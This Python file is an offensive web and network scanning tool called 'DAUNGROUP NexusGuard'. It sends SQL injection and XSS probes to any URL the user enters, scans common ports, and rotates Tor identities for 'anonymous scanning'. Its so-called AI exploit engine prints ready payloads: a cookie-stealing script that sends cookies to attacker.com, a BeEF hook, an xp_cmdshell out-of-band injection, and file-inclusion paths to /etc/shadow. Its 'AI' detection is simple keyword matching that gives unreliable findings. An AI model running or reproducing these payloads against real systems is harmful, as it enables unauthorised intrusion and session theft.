#!/usr/bin/env python3
"""
DAUNGROUP NexusGuard - AI-Powered Multi-Vector Security Testing Framework
Revolutionary security testing tool with AI integration
Created by: DAUNGROUP
"""

import os
import sys
import time
import json
import socket
import requests
import threading
import subprocess
from datetime import datetime
from typing import List, Dict, Optional
import argparse

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.layout import Layout
    from rich.live import Live
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.markdown import Markdown
    import dns.resolver
    from stem import Signal
    from stem.control import Controller
except ImportError:
    print("Installing required dependencies...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", 
                          "rich", "requests", "dnspython", "stem", "pysocks"])
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.layout import Layout
    from rich.live import Live
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.markdown import Markdown
    import dns.resolver
    from stem import Signal
    from stem.control import Controller

console = Console()

# ASCII Art Logo
LOGO = """
[bold cyan]
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗  █████╗ ██╗   ██╗███╗   ██╗ ██████╗ ██████╗      ║
║   ██╔══██╗██╔══██╗██║   ██║████╗  ██║██╔════╝ ██╔══██╗     ║
║   ██║  ██║███████║██║   ██║██╔██╗ ██║██║  ███╗██████╔╝     ║
║   ██║  ██║██╔══██║██║   ██║██║╚██╗██║██║   ██║██╔══██╗     ║
║   ██████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║     ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝     ║
║                                                              ║
║              🛡️  NEXUSGUARD FRAMEWORK 🛡️                    ║
║        AI-Powered Multi-Vector Security Testing             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

[yellow]        ⚡ Revolutionary Security Testing Tool ⚡[/yellow]
[dim]           Combining AI Intelligence with Traditional Methods[/dim]
[/bold cyan]
"""

class AIEngine:
    """AI-Powered Analysis Engine"""
    
    def __init__(self):
        self.vulnerability_db = {
            "sql_injection": {
                "patterns": ["' OR '1'='1", "admin'--", "1' UNION SELECT"],
                "severity": "CRITICAL",
                "description": "SQL Injection vulnerability detected"
            },
            "xss": {
                "patterns": ["<script>", "javascript:", "onerror="],
                "severity": "HIGH",
                "description": "Cross-Site Scripting vulnerability detected"
            },
            "lfi": {
                "patterns": ["../", "..\\", "/etc/passwd"],
                "severity": "HIGH",
                "description": "Local File Inclusion vulnerability detected"
            },
            "command_injection": {
                "patterns": [";ls", "&&", "|whoami"],
                "severity": "CRITICAL",
                "description": "Command Injection vulnerability detected"
            }
        }
    
    def analyze_response(self, response_text: str, status_code: int) -> Dict:
        """AI-powered response analysis"""
        findings = []
        
        # Check for error messages
        error_patterns = [
            "mysql", "sql syntax", "oracle", "postgresql", 
            "sqlite", "odbc", "jdbc", "warning:", "error:"
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response_text.lower():
                findings.append({
                    "type": "Information Disclosure",
                    "severity": "MEDIUM",
                    "detail": f"Sensitive error message: {pattern}"
                })
        
        # Check for common vulnerabilities
        for vuln_type, vuln_data in self.vulnerability_db.items():
            for pattern in vuln_data["patterns"]:
                if pattern in response_text:
                    findings.append({
                        "type": vuln_type,
                        "severity": vuln_data["severity"],
                        "detail": vuln_data["description"]
                    })
        
        return {
            "status": status_code,
            "findings": findings,
            "risk_score": self.calculate_risk_score(findings)
        }
    
    def calculate_risk_score(self, findings: List[Dict]) -> int:
        """Calculate overall risk score"""
        score = 0
        severity_scores = {
            "CRITICAL": 10,
            "HIGH": 7,
            "MEDIUM": 4,
            "LOW": 2
        }
        
        for finding in findings:
            score += severity_scores.get(finding["severity"], 0)
        
        return min(score, 100)
    
    def generate_exploit_suggestion(self, vulnerability: str) -> str:
        """AI-generated exploit suggestions"""
        suggestions = {
            "sql_injection": """
## SQL Injection Exploit Suggestions:
1. **Basic Union-based**: `' UNION SELECT NULL,username,password FROM users--`
2. **Time-based Blind**: `' AND SLEEP(5)--`
3. **Boolean-based**: `' AND 1=1--` vs `' AND 1=2--`
4. **Out-of-band**: `'; EXEC master..xp_cmdshell 'ping attacker.com'--`

### Tools to use:
- SQLMap: `sqlmap -u "URL" --batch --dbs`
- Manual testing with Burp Suite
""",
            "xss": """
## XSS Exploit Suggestions:
1. **Reflected XSS**: `<script>alert(document.cookie)</script>`
2. **DOM-based**: `#<img src=x onerror=alert(1)>`
3. **Stored XSS**: Store malicious script in database
4. **Bypass filters**: `<ScRiPt>alert(1)</sCrIpT>`

### Payloads to try:
- Cookie stealing: `<script>new Image().src="http://attacker.com/"+document.cookie</script>`
- BeEF Hook: `<script src="http://attacker.com/hook.js"></script>`
""",
            "lfi": """
## LFI Exploit Suggestions:
1. **Basic LFI**: `../../../../etc/passwd`
2. **Null byte**: `../../../../etc/passwd%00`
3. **PHP Filter**: `php://filter/convert.base64-encode/resource=index.php`
4. **Log Poisoning**: Inject PHP code in logs then include log file

### Common files to target:
- Linux: `/etc/passwd`, `/etc/shadow`, `/var/log/apache2/access.log`
- Windows: `C:\\Windows\\win.ini`, `C:\\boot.ini`
"""
        }
        
        return suggestions.get(vulnerability, "No specific suggestions available.")


class TORManager:
    """TOR Network Manager for Anonymous Scanning"""
    
    def __init__(self):
        self.tor_port = 9051
        self.socks_port = 9050
        self.enabled = False
    
    def check_tor_status(self) -> bool:
        """Check if TOR is running"""
        try:
            result = subprocess.run(
                ["systemctl", "is-active", "tor"],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except:
            return False
    
    def renew_identity(self) -> bool:
        """Rotate TOR identity"""
        try:
            with Controller.from_port(port=self.tor_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
            time.sleep(3)
            return True
        except Exception as e:
            console.print(f"[red]TOR rotation failed: {e}[/red]")
            return False
    
    def get_current_ip(self) -> Optional[str]:
        """Get current IP through TOR"""
        try:
            proxies = {
                'http': f'socks5://127.0.0.1:{self.socks_port}',
                'https': f'socks5://127.0.0.1:{self.socks_port}'
            }
            response = requests.get('https://api.ipify.org', proxies=proxies, timeout=10)
            return response.text
        except:
            return None


class WebScanner:
    """Advanced Web Application Scanner"""
    
    def __init__(self, use_tor=False):
        self.ai_engine = AIEngine()
        self.tor_manager = TORManager() if use_tor else None
        self.session = requests.Session()
        self.results = []
    
    def scan_target(self, url: str) -> Dict:
        """Comprehensive web scan"""
        console.print(f"\n[cyan]🔍 Scanning target: {url}[/cyan]")
        
        results = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": [],
            "info": {}
        }
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            
            task1 = progress.add_task("[cyan]Reconnaissance...", total=100)
            results["info"] = self.reconnaissance(url)
            progress.update(task1, completed=100)
            
            task2 = progress.add_task("[yellow]Vulnerability Scanning...", total=100)
            results["vulnerabilities"] = self.vulnerability_scan(url)
            progress.update(task2, completed=100)
            
            task3 = progress.add_task("[green]AI Analysis...", total=100)
            results["ai_analysis"] = self.ai_analysis(url)
            progress.update(task3, completed=100)
        
        return results
    
    def reconnaissance(self, url: str) -> Dict:
        """Information gathering"""
        info = {}
        
        try:
            # Get HTTP headers
            response = self.session.get(url, timeout=10)
            info["status_code"] = response.status_code
            info["headers"] = dict(response.headers)
            info["server"] = response.headers.get("Server", "Unknown")
            info["technologies"] = self.detect_technologies(response)
            
            # DNS information
            domain = url.split("//")[1].split("/")[0]
            try:
                info["dns"] = {
                    "A": [str(ip) for ip in dns.resolver.resolve(domain, 'A')],
                    "MX": [str(mx.exchange) for mx in dns.resolver.resolve(domain, 'MX')]
                }
            except:
                info["dns"] = {}
            
        except Exception as e:
            console.print(f"[red]Reconnaissance error: {e}[/red]")
        
        return info
    
    def detect_technologies(self, response) -> List[str]:
        """Detect web technologies"""
        technologies = []
        
        tech_signatures = {
            "WordPress": "wp-content",
            "Joomla": "joomla",
            "Drupal": "drupal",
            "PHP": "<?php",
            "ASP.NET": "asp.net",
            "React": "react",
            "Vue.js": "vue.js",
            "jQuery": "jquery"
        }
        
        content = response.text.lower()
        headers_str = str(response.headers).lower()
        
        for tech, signature in tech_signatures.items():
            if signature.lower() in content or signature.lower() in headers_str:
                technologies.append(tech)
        
        return technologies
    
    def vulnerability_scan(self, url: str) -> List[Dict]:
        """Scan for common vulnerabilities"""
        vulnerabilities = []
        
        # SQL Injection test
        sqli_payloads = ["'", "' OR '1'='1", "admin'--"]
        for payload in sqli_payloads:
            test_url = f"{url}?id={payload}"
            try:
                response = self.session.get(test_url, timeout=5)
                analysis = self.ai_engine.analyze_response(response.text, response.status_code)
                if analysis["findings"]:
                    vulnerabilities.extend(analysis["findings"])
            except:
                pass
        
        # XSS test
        xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
        for payload in xss_payloads:
            test_url = f"{url}?q={payload}"
            try:
                response = self.session.get(test_url, timeout=5)
                if payload in response.text:
                    vulnerabilities.append({
                        "type": "xss",
                        "severity": "HIGH",
                        "detail": "Reflected XSS vulnerability detected"
                    })
            except:
                pass
        
        return vulnerabilities
    
    def ai_analysis(self, url: str) -> Dict:
        """AI-powered comprehensive analysis"""
        try:
            response = self.session.get(url, timeout=10)
            analysis = self.ai_engine.analyze_response(response.text, response.status_code)
            
            # Generate recommendations
            recommendations = []
            for finding in analysis["findings"]:
                suggestion = self.ai_engine.generate_exploit_suggestion(finding["type"])
                recommendations.append({
                    "vulnerability": finding["type"],
                    "suggestion": suggestion
                })
            
            analysis["recommendations"] = recommendations
            return analysis
            
        except Exception as e:
            return {"error": str(e)}


class NetworkScanner:
    """Advanced Network Scanner"""
    
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443]
    
    def scan_ports(self, target: str) -> List[Dict]:
        """Port scanning with service detection"""
        console.print(f"\n[cyan]🌐 Scanning ports on {target}[/cyan]")
        
        open_ports = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            task = progress.add_task(f"[cyan]Scanning {len(self.common_ports)} ports...", total=len(self.common_ports))
            
            for port in self.common_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    service = self.detect_service(port)
                    open_ports.append({
                        "port": port,
                        "state": "open",
                        "service": service
                    })
                    console.print(f"[green]✓ Port {port} ({service}) - OPEN[/green]")
                
                sock.close()
                progress.advance(task)
        
        return open_ports
    
    def detect_service(self, port: int) -> str:
        """Detect service by port"""
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
            443: "HTTPS", 445: "SMB", 3306: "MySQL",
            3389: "RDP", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
        }
        return services.get(port, "Unknown")


class ReportGenerator:
    """Generate comprehensive security reports"""
    
    def generate_report(self, scan_results: Dict, output_file: str = None):
        """Generate detailed report"""
        
        # Console output
        console.print("\n")
        console.print(Panel.fit(
            "[bold cyan]📊 SCAN RESULTS[/bold cyan]",
            border_style="cyan"
        ))
        
        # Summary Table
        summary_table = Table(title="Scan Summary", box=box.ROUNDED)
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="yellow")
        
        summary_table.add_row("Target", scan_results.get("url", "N/A"))
        summary_table.add_row("Timestamp", scan_results.get("timestamp", "N/A"))
        summary_table.add_row("Vulnerabilities Found", str(len(scan_results.get("vulnerabilities", []))))
        
        console.print(summary_table)
        
        # Vulnerabilities Table
        if scan_results.get("vulnerabilities"):
            vuln_table = Table(title="Vulnerabilities Detected", box=box.DOUBLE_EDGE)
            vuln_table.add_column("Type", style="cyan")
            vuln_table.add_column("Severity", style="red")
            vuln_table.add_column("Details", style="yellow")
            
            for vuln in scan_results["vulnerabilities"]:
                vuln_table.add_row(
                    vuln.get("type", "Unknown"),
                    vuln.get("severity", "Unknown"),
                    vuln.get("detail", "No details")
                )
            
            console.print("\n")
            console.print(vuln_table)
        
        # AI Recommendations
        if scan_results.get("ai_analysis", {}).get("recommendations"):
            console.print("\n")
            console.print(Panel("[bold yellow]🤖 AI-GENERATED EXPLOIT SUGGESTIONS[/bold yellow]", border_style="yellow"))
            
            for rec in scan_results["ai_analysis"]["recommendations"]:
                console.print(Markdown(rec["suggestion"]))
        
        # Save to file
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(scan_results, f, indent=2)
            console.print(f"\n[green]✓ Report saved to: {output_file}[/green]")


def main_menu():
    """Main interactive menu"""
    console.clear()
    console.print(LOGO)
    
    menu_table = Table(box=box.DOUBLE_EDGE, show_header=False, border_style="cyan")
    menu_table.add_column("Option", style="cyan", width=50)
    
    menu_table.add_row("[1] 🌐 Web Application Scanner (AI-Powered)")
    menu_table.add_row("[2] 🔍 Network Port Scanner")
    menu_table.add_row("[3] 🔄 TOR IP Rotation Manager")
    menu_table.add_row("[4] 🤖 AI Exploit Suggestion Engine")
    menu_table.add_row("[5] 📊 Generate Security Report")
    menu_table.add_row("[6] ⚙️  Settings")
    menu_table.add_row("[0] 🚪 Exit")
    
    console.print(Panel(menu_table, title="[bold cyan]MAIN MENU[/bold cyan]", border_style="cyan"))
    
    choice = Prompt.ask("\n[bold green]Select option[/bold green]", choices=["0","1","2","3","4","5","6"])
    
    if choice == "1":
        web_scanner_menu()
    elif choice == "2":
        network_scanner_menu()
    elif choice == "3":
        tor_manager_menu()
    elif choice == "4":
        ai_exploit_menu()
    elif choice == "5":
        report_menu()
    elif choice == "6":
        settings_menu()
    elif choice == "0":
        console.print("\n[yellow]👋 Thanks for using DAUNGROUP NexusGuard![/yellow]")
        sys.exit(0)


def web_scanner_menu():
    """Web scanner interface"""
    console.clear()
    console.print(LOGO)
    console.print(Panel("[bold cyan]🌐 WEB APPLICATION SCANNER[/bold cyan]", border_style="cyan"))
    
    target_url = Prompt.ask("\n[yellow]Enter target URL[/yellow]")
    use_tor = Confirm.ask("Use TOR for anonymous scanning?")
    
    scanner = WebScanner(use_tor=use_tor)
    results = scanner.scan_target(target_url)
    
    report_gen = ReportGenerator()
    report_gen.generate_report(results)
    
    if Confirm.ask("\n[yellow]Return to main menu?[/yellow]"):
        main_menu()


def network_scanner_menu():
    """Network scanner interface"""
    console.clear()
    console.print(LOGO)
    console.print(Panel("[bold cyan]🔍 NETWORK PORT SCANNER[/bold cyan]", border_style="cyan"))
    
    target = Prompt.ask("\n[yellow]Enter target IP or domain[/yellow]")
    
    scanner = NetworkScanner()
    results = scanner.scan_ports(target)
    
    console.print(f"\n[green]✓ Found {len(results)} open ports[/green]")
    
    if Confirm.ask("\n[yellow]Return to main menu?[/yellow]"):
        main_menu()


def tor_manager_menu():
    """TOR manager interface"""
    console.clear()
    console.print(LOGO)
    console.print(Panel("[bold cyan]🔄 TOR IP ROTATION MANAGER[/bold cyan]", border_style="cyan"))
    
    tor_mgr = TORManager()
    
    if not tor_mgr.check_tor_status():
        console.print("[red]✗ TOR service is not running![/red]")
        console.print("[yellow]Start TOR with: sudo systemctl start tor[/yellow]")
    else:
        console.print("[green]✓ TOR service is running[/green]")
        
        current_ip = tor_mgr.get_current_ip()
        if current_ip:
            console.print(f"[cyan]Current IP: {current_ip}[/cyan]")
        
        if Confirm.ask("\nRotate IP now?"):
            console.print("[yellow]Rotating IP...[/yellow]")
            if tor_mgr.renew_identity():
                new_ip = tor_mgr.get_current_ip()
                console.print(f"[green]✓ New IP: {new_ip}[/green]")
    
    if Confirm.ask("\n[yellow]Return to main menu?[/yellow]"):
        main_menu()


def ai_exploit_menu():
    """AI exploit suggestion interface"""
    console.clear()
    console.print(LOGO)
    console.print(Panel("[bold cyan]🤖 AI EXPLOIT SUGGESTION ENGINE[/bold cyan]", border_style="cyan"))
    
    ai_engine = AIEngine()
    
    vuln_type = Prompt.ask(
        "\n[yellow]Select vulnerability type[/yellow]",
        choices=["sql_injection", "xss", "lfi", "command_injection"]
    )
    
    suggestion = ai_engine.generate_exploit_suggestion(vuln_type)
    console.print(Markdown(suggestion))
    
    if Confirm.ask("\n[yellow]Return to main menu?[/yellow]"):
        main_menu()


def report_menu():
    """Report generation menu"""
    console.print("\n[yellow]Report generation requires scan results.[/yellow]")
    console.print("[cyan]Please run a scan first.[/cyan]")
    time.sleep(2)
    main_menu()


def settings_menu():
    """Settings menu"""
    console.clear()
    console.print(LOGO)
    console.print(Panel("[bold cyan]⚙️  SETTINGS[/bold cyan]", border_style="cyan"))
    
    console.print("\n[yellow]Settings coming soon...[/yellow]")
    time.sleep(2)
    main_menu()


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="DAUNGROUP NexusGuard - AI-Powered Security Framework")
        parser.add_argument("--cli", action="store_true", help="Run in CLI mode")
        parser.add_argument("--scan", type=str, help="Target URL to scan")
        args = parser.parse_args()
        
        if args.cli and args.scan:
            scanner = WebScanner()
            results = scanner.scan_target(args.scan)
            report_gen = ReportGenerator()
            report_gen.generate_report(results)
        else:
            main_menu()
            
    except KeyboardInterrupt:
        console.print("\n\n[yellow]👋 Interrupted by user. Goodbye![/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]Fatal error: {e}[/red]")
        sys.exit(1)
